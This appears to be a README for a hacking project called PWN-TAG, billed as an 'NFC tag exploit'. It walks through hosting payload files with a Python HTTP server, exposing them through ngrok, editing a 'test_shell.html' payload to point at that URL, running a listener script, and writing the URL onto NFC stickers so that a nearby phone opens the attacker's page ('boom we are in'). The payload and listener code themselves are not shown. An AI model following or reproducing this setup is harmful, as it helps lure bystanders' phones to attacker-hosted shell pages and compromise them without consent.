# PWN-TAG
"tag to pwn" NFC tag exploit

things you need: 

nfc tag stickers about $10 for 25 >

https://a.co/d/gl2XRV8

nfc tag writer app:
something similar to this one works and 
the free edition works too

https://apps.apple.com/app/id1252962749

lastly you need a debian based linux distro



##Start HTTP Server in Terminal 1

In your ~/PWN_TAG folder:

```bash
python3 -m http.server 8080
```
Leave it running — this hosts your payloads.

## Start ngrok in Terminal 2

Open a new terminal tab or split window, then run:

```bash
ngrok http 8080
```
Copy that https://... link — that’s your live web URL.

## Update test_shell.html in Terminal 3

If you haven’t updated yet:

```bash
nano payloads/test_shell.html
```
Replace with your real ngrok link

##Start Listener in Terminal 4

```bash
python3 listener.py
```

## imbed NFC tag with url:

open nfc writer app

-choose write

-add record

-choose url

-place ngrok link "https://f6xd-3301-602...ngrok-free.app/payloads/test_shell.html"

-write

## now just place your phone near the tag and boom we are in

## H^3 hope all is well homies




